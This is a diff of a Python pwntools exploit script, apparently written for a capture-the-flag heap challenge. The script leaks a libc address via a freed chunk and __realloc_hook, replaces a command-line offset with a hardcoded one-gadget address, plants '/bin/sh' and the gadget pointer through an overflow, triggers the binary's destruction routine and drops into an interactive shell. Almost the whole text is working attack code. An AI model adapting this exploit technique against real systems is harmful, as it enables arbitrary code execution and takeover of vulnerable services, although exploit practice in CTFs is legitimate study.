@@ -42,15 +42,15 @@ def destruction():
     p.sendlineafter('0. Exit\n', '7')
 
 build('AAAA\n', '90', 45, 'DESC')
-build('BBBB\n', '90', 45, 'CDEf')
+build('AAAA\n', '90', 45, 'DESC')
 select(0)
 delete()
 libc_base = u64(prnt()[0].ljust(8,'\0'))-0x70-libc.symbols['__realloc_hook']
 print(hex(libc_base))
 
-system = libc_base + int(args.OFF,16)
+target = libc_base + 0xf02a4
 
-add_comment(0xB8-1, '/bin/sh\0'.ljust(0xB0, '\0')+p64(system)[:-1])
+add_comment(0xB8-1, '/bin/sh\0'.ljust(0xB0, '\0')+p64(target)[:-1])
 
 for i in range(11):
     build('BBBB\n', '90', 45, 'CDEf')
@@ -60,20 +60,5 @@ for i in 'SUNIATRETNE'[::-1]:
     p.send(i)
 p.send('\n')
 
-pause()
-
 destruction()
-
-
-
 p.interactive()
-
-
-
-
-
-
-
-
-
-
